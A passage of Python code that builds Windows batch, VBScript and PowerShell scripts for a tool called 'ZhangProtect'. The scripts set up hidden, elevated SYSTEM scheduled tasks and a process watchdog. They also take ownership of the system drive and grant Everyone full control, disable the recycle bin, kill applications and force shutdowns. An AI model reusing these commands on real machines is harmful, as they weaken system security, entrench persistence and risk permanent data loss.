            + "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\Maximize"
            + chr(34)
            + " (echo) else (if "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\Open"
            + chr(34)
            + " (echo) else (if "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\Close"
            + chr(34)
            + " (echo) else (if "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\RestoreUp"
            + chr(34)
            + " (echo) else (if "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\CCSelect"
            + chr(34)
            + " (echo) else ("
            + chr(10)
            + "reg add "
            + chr(34)
            + "%%i\iKun"
            + chr(34)
            + " /d "
            + chr(34)
            + ikun_wav_file
            + chr(34)
            + " /f))))))"
            + chr(10)
            + ")"
            + chr(10)
            + "for /f "
            + chr(34)
            + "delims="
            + chr(34)
            + " %%i in ("
            + chr(39)
            + "dir /B /A %datadir%:\\"
            + chr(39)
            + ") do ("
            + chr(10)
            + "echo [.ShellClassInfo] >%datadir%:\\%%i\\desktop.ini"
            + chr(10)
            + "echo InfoTip=这是由ZhangProtect创建并保护的文件夹 >>%datadir%:\\%%i\\desktop.ini"
            + chr(10)
            + "echo IconResource="
            + ProtectExe
            + ",0 >>%datadir%:\\%%i\\desktop.ini"
            + chr(10)
            + ")"
            + chr(10)
            + 'for %%k in (1 2 3 4 5) do (for /f "delims=" %%i in (\'dir /B /A %datadir%:\\'
            + "') do (attrib +s %datadir%:\\%%i))"
            + chr(10)
            + 'for %%k in (1 2 3 4 5) do (for /f "delims=" %%i in (\'dir /B /A %datadir%:\\'
            + "') do (attrib +s +r +h %datadir%:\\%%i\\desktop.ini))"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v ConfirmFileDelete /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\AppEvents\\Schemes\\Names\\iKun /d iKun /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer /t REG_DWORD /v HubMode /d 1 /f"
            + chr(10)
            + "for /f \"delims=\" %%i in ('reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop') do (reg delete %%i\\{f874310e-b6b7-47dc-bc84-b9e6b38f5903} /f)"
            + chr(10)
            + "if exist "
            + ikun_icon_flag
            + ' (echo) else (for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\DriveIcons\\%%i\\DefaultIcon /d ""'
            + ProtectExe
            + '",0" /f))'
            + chr(10)
            + "cmd /c "
            + chr(34)
            + AllRunCommand
            + chr(34)
            + "<"
            + AutoAnswer
        )
        BatComA = (
            BatComA1
            + chr(10)
            + BatComA2
            + chr(10)
            + BatComA3
            + chr(10)
            + BatComA4
            + chr(10)
            + BatComA5
            + chr(10)
            + BatComA6
        )
        BATRUNVBS = (
            "CreateObject"
            + chr(40)
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + chr(41)
            + ".ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + chr(44)
            + chr(34)
            + "/c "
            + ProtectBAT
            + "<"
            + AutoAnswer
            + chr(34)
            + chr(44)
            + chr(34)
            + chr(34)
            + chr(44)
            + "runas"
            + chr(44)
            + "0"
            + chr(10)
            + "CreateObject"
            + chr(40)
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + chr(41)
            + ".ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + chr(44)
            + chr(34)
            + "/c powershell "
            + ProtectWifi
            + chr(34)
            + chr(44)
            + chr(34)
            + chr(34)
            + chr(44)
            + "runas"
            + chr(44)
            + "0"
        )
        VBAllRun = (
            "CreateObject"
            + chr(40)
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + chr(41)
            + ".ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + chr(44)
            + chr(34)
            + "/c "
            + AllRunCommand
            + "<"
            + AutoAnswer
            + chr(34)
            + chr(44)
            + chr(34)
            + chr(34)
            + chr(44)
            + "runas"
            + chr(44)
            + "0"
        )
        ProtectKeeperBAT = (
            "proname = "
            + chr(34)
            + "Protect.exe"
            + chr(34)
            + ""
            + chr(10)
            + "Set wmi = GetObject("
            + chr(34)
            + "winmgmts:{impersonationlevel=impersonate}!\\"
            + "\\.\\root\\cimv2"
            + chr(34)
            + ")"
            + chr(10)
            + "Set procs = wmi.execquery("
            + chr(34)
            + "select * from win32_process"
            + chr(34)
            + ")"
            + chr(10)
            + "flag = True"
            + chr(10)
            + "For Each proc In procs"
            + chr(10)
            + "If StrComp(proc.Name, proname) = 0 Then"
            + chr(10)
            + "flag = False"
            + chr(10)
            + "Exit For"
            + chr(10)
            + "End If"
            + chr(10)
            + "Next"
            + chr(10)
            + "Set wmi = Nothing"
            + chr(10)
            + "If flag Then"
            + chr(10)
            + "Wscript.sleep 300000"
            + chr(10)
            + "CreateObject("
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + ").ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + ","
            + chr(34)
            + "/c schtasks /run /I /tn ZhangProtect\\Protect"
            + chr(34)
            + ","
            + chr(34)
            + ""
            + chr(34)
            + ",runas,0"
            + chr(10)
            + "End If"
        )
        global openwifi
        if (hidesettingflag == "1" or os.path.isfile(openwifi)) and (
            not os.path.isfile(closewifi) and not os.path.isfile(use_36o_ap_flag)
        ):
            WifiShareStart = (
                "Add-Type -AssemblyName System.Runtime.WindowsRuntime"
                + chr(10)
                + "$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]"
                + chr(10)
                + "Function Await($WinRtTask, $ResultType) {"
                + chr(10)
                + "$asTask = $asTaskGeneric.MakeGenericMethod($ResultType)"
                + chr(10)
                + "$netTask = $asTask.Invoke($null, @($WinRtTask))"
                + chr(10)
                + "$netTask.Wait(-1) | Out-Null"
                + chr(10)
                + "$netTask.Result"
                + chr(10)
                + "}"
                + chr(10)
                + "Function AwaitAction($WinRtAction) {"
                + chr(10)
                + "$asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and !$_.IsGenericMethod })[0]"
                + chr(10)
                + "$netTask = $asTask.Invoke($null, @($WinRtAction))"
                + chr(10)
                + "$netTask.Wait(-1) | Out-Null"
                + chr(10)
                + "}"
                + chr(10)
                + "$connectionProfile = [Windows.Networking.Connectivity.NetworkInformation,Windows.Networking.Connectivity,ContentType=WindowsRuntime]::GetInternetConnectionProfile()"
                + chr(10)
                + "$tetheringManager = [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager,Windows.Networking.NetworkOperators,ContentType=WindowsRuntime]::CreateFromConnectionProfile($connectionProfile)"
                + chr(10)
                + "$setting=$tetheringManager.GetCurrentAccessPointConfiguration()"
                + chr(10)
                + "$ssid="
                + chr(34)
                + str(wifiid)
                + chr(34)
                + ""
                + chr(10)
                + "$password="
                + chr(34)
                + str(wifipw)
                + chr(34)
                + ""
                + chr(10)
                + "if ($tetheringManager.TetheringOperationalState -eq 1) {"
                + chr(10)
                + "$nssid=$setting.Ssid"
                + chr(10)
                + "$npassword=$setting.passphrase"
                + chr(10)
                + "if ($nssid -ceq $ssid) {"
                + chr(10)
                + ""
                + chr(34)
                + ""
                + chr(34)
                + ""
                + chr(10)
                + "}"
                + chr(10)
                + "else{"
                + chr(10)
                + "Await ($tetheringManager.StopTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])"
                + chr(10)
                + "}"
                + chr(10)
                + "if ($npassword -ceq $password) {"
                + chr(10)
                + ""
                + chr(34)
                + ""
                + chr(34)
                + ""
                + chr(10)
                + "}"
                + chr(10)
                + "else{"
                + chr(10)
                + "Await ($tetheringManager.StopTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])"
                + chr(10)
                + "}"
                + chr(10)
                + "}"
                + chr(10)
                + "else{"
                + chr(10)
                + "$setting.Ssid = $ssid"
                + chr(10)
                + "$setting.passphrase = $password"
                + chr(10)
                + "$setting.Band = "
                + chr(34)
                + str(wifibd)
                + chr(34)
                + ""
                + chr(10)
                + "$tetheringManager.ConfigureAccessPointAsync($setting)"
                + chr(10)
                + "Await ($tetheringManager.StartTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])"
                + chr(10)
                + "}"
            )
        else:
            WifiShareStart = "echo Disable"
        StopWifiShareps = (
            "Add-Type -AssemblyName System.Runtime.WindowsRuntime"
            + chr(10)
            + "$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]"
            + chr(10)
            + "Function Await($WinRtTask, $ResultType) {"
            + chr(10)
            + "$asTask = $asTaskGeneric.MakeGenericMethod($ResultType)"
            + chr(10)
            + "$netTask = $asTask.Invoke($null, @($WinRtTask))"
            + chr(10)
            + "$netTask.Wait(-1) | Out-Null"
            + chr(10)
            + "$netTask.Result"
            + chr(10)
            + "}"
            + chr(10)
            + "Function AwaitAction($WinRtAction) {"
            + chr(10)
            + "$asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and !$_.IsGenericMethod })[0]"
            + chr(10)
            + "$netTask = $asTask.Invoke($null, @($WinRtAction))"
            + chr(10)
            + "$netTask.Wait(-1) | Out-Null"
            + chr(10)
            + "}"
            + chr(10)
            + "$connectionProfile = [Windows.Networking.Connectivity.NetworkInformation,Windows.Networking.Connectivity,ContentType=WindowsRuntime]::GetInternetConnectionProfile()"
            + chr(10)
            + "$tetheringManager = [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager,Windows.Networking.NetworkOperators,ContentType=WindowsRuntime]::CreateFromConnectionProfile($connectionProfile)"
            + chr(10)
            + "$setting=$tetheringManager.GetCurrentAccessPointConfiguration()"
            + chr(10)
            + "Await ($tetheringManager.StopTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])"
        )
        regini = (
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket [2 8 19]"
            + chr(10)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket [2 8 19]"
            + chr(10)
            + "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray [1 7 17]"
            + chr(10)
            + "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray"
            + chr(10)
            + chr(34)
            + "Services"
            + chr(34)
            + "= REG_DWORD 29"
        )
        ProtectTest = (
            "/c"
            + " "
            + "schtasks /run /I /tn ZhangProtect\\Protect & shutdown -r -t 30"
        )
        Regset = "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /f & reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /f & reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecycleFiles /d 1 /f  & reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray /v Services /t reg_dword /d 29 /f & reg add HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /t REG_SZ /v ExecutionPolicy /d RemoteSigned /f"
        ProtectInstaller = (
            "/c"
            + " "
            + "schtasks /create /F /tn ZhangProtect\\ProtectInstaller /RU Users /RL HIGHEST /SC ONCE /ST 00:00 /TR"
            + " "
            + ProtectExe
            + " "
            + "& schtasks /run /I /tn ZhangProtect\\ProtectInstaller & timeout /t 5 & schtasks /delete /F /tn ZhangProtect\\ProtectInstaller"
        )
        BINDIR = str(os.environ.get("systemdrive"))
        if hidesettingflag == "1":
            UsbChange = (
                "schtasks /create /F /tn ZhangProtect\\UsbChanger /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /SC MINUTE /mo 3 /TR"
                + " "
                + UsbChanger
            )
        else:
            UsbChange = (
                "schtasks /create /F /tn ZhangProtect\\UsbChanger /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /SC MINUTE /mo 3 /TR"
                + " "
                + UsbChanger
            )
        if hidesettingflag == "1":
            OnedirveprecomA = (
                "icacls"
                + " "
                + chr(39)
                + Onedriveupdatedir
                + ""
                + chr(39)
                + " "
                + "/t /c /q /inheritance:e"
            )
            OnedirveprecomB = (
                "takeown /f"
                + " "
                + chr(39)
                + Onedriveupdatedir
                + "\\*"
                + chr(39)
                + " "
                + "/a /r /d y"
            )
            OnedirveprecomC = (
                "icacls"
                + " "
                + chr(39)
                + Onedriveupdatedir
                + ""
                + chr(39)
                + " "
                + "/t /c /grant:r Everyone:(OI)(CI)(F)"
            )
            datadircomA = (
                "icacls"
                + " "
                + chr(39)
                + datadir
                + ":"
                + chr(39)
                + " "
                + "/t /c /q /inheritance:e"
            )
            datadircomB = (
                "takeown /f"
                + " "
                + chr(39)
                + datadir
                + ":\\*"
                + chr(39)
                + " "
                + "/a /r /d y"
            )
            datadircomC = (
                "icacls"
                + " "
                + chr(39)
                + datadir
                + ":"
                + chr(39)
                + " "
                + "/t /c /grant:r Everyone:(OI)(CI)(F)"
            )
            systemdircomA = "takeown /f %systemdrive%\\* /a /r /d y"
            systemdircomB = "icacls %systemdrive% /t /c /q /inheritance:e /grant:r Everyone:(OI)(CI)(F)"
            systemdircomC = (
                "echo 1 > "
                + AutoPreCFlag
                + " & schtasks /Change /tn ZhangProtect\\AutoPreC /Disable"
            )
        else:
            OnedirveprecomA = "echo Disable"
            OnedirveprecomB = "echo Disable"
            OnedirveprecomC = "echo Disable"
            datadircomA = "echo Disable"
            datadircomB = "echo Disable"
            datadircomC = "echo Disable"
            systemdircomA = "echo Disable"
            systemdircomB = "echo Disable"
            systemdircomC = "echo Disable"
        SchTaskcomA = (
            chr(34)
            + "cmd /c"
            + " "
            + OnedirveprecomA
            + " "
            + "&"
            + " "
            + OnedirveprecomB
            + " "
            + "&"
            + " "
            + OnedirveprecomC
            + chr(34)
        )
        SchTaskcomB = (
            chr(34)
            + "cmd /c"
            + " "
            + datadircomA
            + " "
            + "&"
            + " "
            + datadircomB
            + " "
            + "&"
            + " "
            + datadircomC
            + chr(34)
        )
        SchTaskcomC = (
            chr(34)
            + "cmd /c"
            + " "
            + systemdircomA
            + " "
            + "&"
            + " "
            + systemdircomB
            + " "
            + "&"
            + " "
            + systemdircomC
            + chr(34)
        )
        autoshutdown = ""
        shshutdowntimelist = autoshutdowntime.split("*")
        if hidesettingflag == "1":
            for i in range(len(shshutdowntimelist)):
                if os.path.isfile(usehibernate):
                    autoshutdown += (
                        chr(10)
                        + "schtasks /create /F /SC DAILY /RU"
                        + " "
                        + chr(34)
                        + "SYSTEM"
                        + chr(34)
                        + " "
                        + "/RL HIGHEST /tn ZhangProtect\\AutoShutdown-"
                        + str(i)
                        + " /TR"
                        + " "
                        + chr(34)
                        + "shutdown -h"
                        + chr(34)
                        + "  "
                        + "/ST"
                        + " "
                        + shshutdowntimelist[i]
                    )
                else:
                    autoshutdown += (
                        chr(10)
                        + "schtasks /create /F /SC DAILY /RU"
                        + " "
                        + chr(34)
                        + "SYSTEM"
                        + chr(34)
                        + " "
                        + "/RL HIGHEST /tn ZhangProtect\\AutoShutdown-"
                        + str(i)
                        + " /TR"
                        + " "
                        + chr(34)
                        + "shutdown -s -t 0"
                        + chr(34)
                        + "  "
                        + "/ST"
                        + " "
                        + shshutdowntimelist[i]
                    )
        else:
            for i in range(len(shshutdowntimelist)):
                autoshutdown += (
                    chr(10)
                    + "schtasks /Delete /F /tn ZhangProtect\\AutoShutdown-"
                    + str(i)
                )
        if hidesettingflag == "1":
            autochangepreA = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreA /sc MINUTE /mo 3"
                + " "
                + "/tr"
                + " "
                + SchTaskcomA
            )
        else:
            autochangepreA = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreA /sc MINUTE /mo 3"
                + " "
                + "/tr"
                + " "
                + SchTaskcomA
            )
        if hidesettingflag == "1":
            autochangepreB = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreB /sc MINUTE /mo 3"
                + " "
                + "/tr"
                + " "
                + SchTaskcomB
            )
        else:
            autochangepreB = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreB /sc MINUTE /mo 3"
                + " "
                + "/tr"
                + " "
                + SchTaskcomB
            )
        if hidesettingflag == "1":
            autochangepreC = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreC /sc MINUTE /mo 3"
                + " "
                + "/tr"
                + " "
                + SchTaskcomC
            )
        else:
            autochangepreC = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreC /sc MINUTE /mo 3"
                + " "
                + "/tr"
                + " "
                + SchTaskcomC
            )
        AppProtectA = (
            "schtasks /create /F /RU Users /RL LIMITED /tn ZhangProtect\\AppProtectA /SC ONLOGON /TR"
            + " "
            + chr(34)
            + tdir0
            + chr(34)
        )
        AppProtectB = (
            "schtasks /create /F /RU Users /RL HIGHEST /tn ZhangProtect\\AppProtectB /SC ONLOGON /TR"
            + " "
            + chr(34)
            + tdir1
            + chr(34)
        )
        AppProtectC = (
            "schtasks /create /F /RU "
            + chr(34)
            + "SYSTEM"
            + chr(34)
            + " /RL HIGHEST /tn ZhangProtect\\AppProtectC /SC ONLOGON /TR"
            + " "
            + chr(34)
            + tdir2
            + chr(34)
        )
        AppRunA = "schtasks /run /I /tn ZhangProtect\\AppProtectA"
        AppRunB = "schtasks /run /I /tn ZhangProtect\\AppProtectB"
        AppRunC = "schtasks /run /I /tn ZhangProtect\\AppProtectC"
        changetaskrunA = "schtasks /run /I /tn ZhangProtect\\AutoPreA"
        changetaskrunB = "schtasks /run /I /tn ZhangProtect\\AutoPreB"
        changetaskrunC = "schtasks /run /I /tn ZhangProtect\\AutoPreC"
        UsbChangerRun = "schtasks /run /I /tn ZhangProtect\\UsbChanger"
        MyComputerClean = (
            "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{088e3905-0323-4b02-9826-5d99428e115f} /f "
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{0DB7E03F-FC29-4DC6-9020-FF41B59E513A} /f "
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{24ad3ad4-a569-4530-98e1-ab02f9417aa8} /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{3dfdf296-dbec-4fb4-81d1-6a3438bcf4de}  /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{d3162b92-9365-467a-956b-92703aca08af} /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{f86fa3ab-70d2-4fc7-9c99-fcbf05467f3a} /f"
        )
        if hidesettingflag == "1":
            WifiKeepersch = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\KeepWifi /sc MINUTE /mo 3 /tr"
                + " "
                + chr(34)
                + "cmd /c powershell "
                + ProtectWifi
                + chr(34)
            )
        else:
            WifiKeepersch = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\KeepWifi /sc MINUTE /mo 3 /tr"
                + " "
                + chr(34)
                + "cmd /c powershell "
                + ProtectWifi
                + chr(34)
            )
        if hidesettingflag == "1":
            ProtectKeepersch = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\ProtectKeeper /sc MINUTE /mo 3 /tr"
                + " "
                + chr(34)
                + ProtectKeeper
                + chr(34)
            )
        else:
            ProtectKeepersch = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\ProtectKeeper /sc MINUTE /mo 3 /tr"
                + " "
                + chr(34)
                + ProtectKeeper
                + chr(34)
            )
        if hidesettingflag == "1":
            BatKeeperRunsch = (
                "schtasks /create /F /ru Users /RL HIGHEST /tn ZhangProtect\\BatKeeperRun /sc MINUTE /mo 3 /tr"
                + " "
                + chr(34)
                + BATKEEPER
                + chr(34)
            )
        else:
            BatKeeperRunsch = (
                "schtasks /create /F /ru Users /RL HIGHEST /tn ZhangProtect\\BatKeeperRun /sc MINUTE /mo 3 /tr"
                + " "
                + chr(34)
                + BATKEEPER
                + chr(34)
            )
        AutoPreDrun = (
            "schtasks /run /I /tn ZhangProtect\\AutoPreD"
            + chr(10)
            + "schtasks /run /I /tn ZhangProtect\\KeepWifi"
        )
        if hidesettingflag == "1":
            MaketheLink = (
                "mklink /d"
                + " "
                + chr(34)
                + Onedriveupdatedir
                + "\\AllData"
                + chr(34)
                + " "
                + datadir
                + ":"
            )
        else:
            MaketheLink = "echo Disable"
        datadis = "set datadir=" + datadir
        StorageRedirect1 = (
            "md "
            + chr(34)
            + ""
            + chr(34)
            + "%datadir%:\\StorageRedirect\\AppData-%username%"
            + chr(34)
            + ""
            + chr(34)
            + chr(10)
            + "md "
            + chr(34)
            + ""
            + chr(34)
            + "%datadir%:\\StorageRedirect\\LocalAppData-%username%"
            + chr(34)
            + ""
            + chr(34)
            + chr(10)
            + "md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\StartMenu-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\AppData-%username%\\AppdataRedflag"
            + chr(34)
            + " (echo) else ("
            + chr(10)
            + "echo d | xcopy /Y /E /C /R %AppData% "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\AppData-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo d | xcopy /Y /E /C /R %LocalAppData% "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\LocalAppData-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%AppData%\\Microsoft\\Windows\\Start Menu"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\StartMenu-%username%"
            + chr(34)
            + ""
            + chr(10)
            + ")"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
            + chr(34)
            + " /t REG_SZ /v "
            + chr(34)
            + "AppData"
            + chr(34)
            + " /d "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\AppData-%username%"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
            + chr(34)
            + " /t REG_SZ /v "
            + chr(34)
            + "Local AppData"
            + chr(34)
            + " /d "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\LocalAppData-%username%"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
            + chr(34)
            + " /t REG_SZ /v "
            + chr(34)
            + "Start Menu"
            + chr(34)
            + " /d "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\StartMenu-%username%"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_EXPAND_SZ /v "
            + chr(34)
            + "AppData"
            + chr(34)
            + " /d "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\AppData-%username%"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_EXPAND_SZ /v "
            + chr(34)
            + "Local AppData"
            + chr(34)
            + " /d "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\LocalAppData-%username%"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_EXPAND_SZ /v "
            + chr(34)
            + "Start Menu"
            + chr(34)
            + " /d "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\StartMenu-%username%"
            + chr(34)
            + " /f"
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\AppData-%username%\\AppdataRedflag"
            + chr(34)
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\KuGou8-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (taskkill /f /im Kugou.exe /t)"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Netease-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (taskkill /f /im couldmusic.exe /t)"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\OneDrive-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (Taskkill /f /im OneDrive.exe /t)"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Edge-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (Taskkill /f /im msedge.exe /t)"
            + chr(10)
            + "md "
            + chr(34)
            + "%datadir%:\\StorageRedirect"
            + chr(34)
            + ""
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Netease-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%LocalAppData%\\Netease\\"
            + chr(34)
            + "  "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Netease-%username%\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Netease-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (rd /q /s "
            + chr(34)
            + "%LocalAppData%\\Netease"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Netease-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (md "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Netease-%username%"
            + chr(34)
            + ")"
            + chr(10)
            + "mklink /D "
            + chr(34)
            + "%LocalAppData%\\Netease"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\Netease-%username%"
            + chr(34)
            + ""
            + chr(10)
            + "echo 1 > "
            + chr(34)
            + "%LocalAppData%\\Netease\\linkflag-%username%"
            + chr(34)
            + ""
        )
        StorageRedirect2 = (
            "if exist "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\KuGou8-%username%\\linkflag-%username%"
            + chr(34)
            + " (echo) else (echo d | xcopy /Y /E /C /R "
            + chr(34)
            + "%AppData%\\KuGou8\\"
            + chr(34)
            + " "
            + chr(34)
            + "%datadir%:\\StorageRedirect\\KuGou8-%username%\\"
            + chr(34)
            + ")"
            + chr(10)
            + "if exist "
            + chr(34)
